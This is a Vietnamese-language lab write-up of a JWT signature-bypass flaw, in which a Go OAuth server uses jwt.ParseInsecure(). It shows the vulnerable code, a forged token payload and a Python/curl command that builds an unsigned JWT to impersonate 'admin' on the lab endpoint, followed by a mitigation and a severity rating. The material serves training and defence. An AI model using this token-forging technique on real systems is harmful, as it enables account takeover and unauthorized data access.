# Lab04 - JWT Signature Bypass Vulnerability

## Tóm tắt lỗ hổng

Lab04 chứa lỗ hổng bảo mật nghiêm trọng trong việc xử lý JWT token. Server sử dụng `jwt.ParseInsecure()` thay vì `jwt.Parse()` với signature verification, cho phép attacker bypass hoàn toàn authentication.

## Chi tiết lỗ hổng

### Vị trí lỗ hổng
```go
// File: lab04/server/internal/services/accesstoken.go:116
func (a *AccessTokenService) Get(ctx context.Context, signedToken string) (*dto.AccessToken, error) {
    token, err := jwt.ParseInsecure(  // ⚠️ Lỗ hổng ở đây!
        []byte(signedToken),
        jwt.WithIssuer(a.meta.Issuer),
        jwt.WithRequiredClaim("jti"),
        jwt.WithRequiredClaim("aud"),
        jwt.WithRequiredClaim("sub"),
        jwt.WithRequiredClaim("scope"),
        jwt.WithRequiredClaim("client_id"),
        jwt.WithValidator(a.validator(ctx)),
    )
    // ...
}
```

### Nguyên nhân
- **`jwt.ParseInsecure()`**: Function này không verify signature của JWT
- **Thiếu signature verification**: Server tin tưởng bất kỳ JWT nào có format đúng
- **Validation không đủ**: Chỉ check format và required claims, không check tính authentic

### Impact
- **Complete Authentication Bypass**: Attacker có thể impersonate bất kỳ user nào
- **Data Exposure**: Truy cập thông tin profile của users khác
- **Privilege Escalation**: Có thể leo thang quyền thành admin

## Cách exploit

### Yêu cầu cho exploit thành công
1. **Client ID hợp lệ**: Phải sử dụng client_id có trong database
2. **Required Claims**: JWT phải chứa: `jti`, `aud`, `sub`, `scope`, `client_id`
3. **Audience validation**: `client_id` phải có trong `aud` array
4. **Target user**: User phải tồn tại trong database

### Client ID trong lab04
```yaml
# Từ docker/lab04/client.config.yaml
client:
  id: 'f20e7e23-0376-4c18-9e05-1f862264a288'
```

### Endpoint target
- **URL**: `https://server-04.oauth.labs/api/users/me`
- **Method**: GET
- **Authentication**: Bearer JWT token
- **Response**: User profile information

### Payload JWT structure
```json
{
  "header": {
    "alg": "RS256",  // Không quan trọng vì server không verify
    "typ": "JWT"
  },
  "payload": {
    "iss": "https://server-04.oauth.labs",
    "sub": "admin",  // Username để impersonate
    "aud": ["f20e7e23-0376-4c18-9e05-1f862264a288"],
    "exp": 1735689600,  // Future timestamp
    "iat": 1672153600,
    "jti": "fake-jti-id",
    "scope": "read:profile",
    "client_id": "f20e7e23-0376-4c18-9e05-1f862264a288"
  },
  "signature": "fake_signature"  // Bất kỳ string nào
}
```

## Scripts exploit

### 1. Python script (lab04_working_exploit.py)
```bash
python3 lab04_working_exploit.py
```
Features:
- Test multiple usernames
- Detailed error handling
- Clear success/failure reporting

### 2. Bash script (lab04_curl_exploit.sh)
```bash
./lab04_curl_exploit.sh
```
Features:
- Lightweight curl-based testing
- Quick verification
- Cross-platform compatible

### 3. Manual curl command
```bash
# Tạo JWT với Python
JWT=$(python3 -c "
import json, base64, time
h = base64.urlsafe_b64encode(json.dumps({'alg':'RS256','typ':'JWT'}).encode()).decode().rstrip('=')
p = base64.urlsafe_b64encode(json.dumps({
    'iss': 'https://server-04.oauth.labs',
    'sub': 'admin',
    'aud': ['f20e7e23-0376-4c18-9e05-1f862264a288'],
    'exp': int(time.time()) + 3600,
    'iat': int(time.time()),
    'jti': 'exploit',
    'scope': 'read:profile',
    'client_id': 'f20e7e23-0376-4c18-9e05-1f862264a288'
}).encode()).decode().rstrip('=')
print(f'{h}.{p}.fake')
")

# Exploit endpoint
curl -k -H "Authorization: Bearer $JWT" \
  https://server-04.oauth.labs/api/users/me
```

## Mitigation

### Cách sửa lỗ hổng
1. **Sử dụng `jwt.Parse()` thay vì `jwt.ParseInsecure()`**
2. **Thêm signature verification với public key**
3. **Validate issuer, audience, expiration claims**

### Code fix example
```go
// BEFORE (vulnerable)
token, err := jwt.ParseInsecure([]byte(signedToken), options...)

// AFTER (secure)
token, err := jwt.Parse([]byte(signedToken), 
    jwt.WithKey(jwa.RS256, publicKey),  // Add signature verification
    options...)
```

## Testing

### Yêu cầu môi trường
- Lab04 server phải đang chạy
- Access đến `https://server-04.oauth.labs`
- Python 3 với `requests` library
- Bash shell (cho script curl)

### Các user thường có trong database
- `admin` - Administrator account
- `alice`, `bob` - Demo users
- `user1`, `test` - Test accounts

## Severity Assessment

- **CVSS Score**: 9.1 (Critical)
- **Attack Vector**: Network
- **Attack Complexity**: Low
- **Privileges Required**: None
- **User Interaction**: None
- **Impact**: Complete authentication bypass

## References

- [JWT.io - Introduction to JSON Web Tokens](https://jwt.io/introduction/)
- [RFC 7519 - JSON Web Token (JWT)](https://tools.ietf.org/html/rfc7519)
- [OWASP JWT Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html) 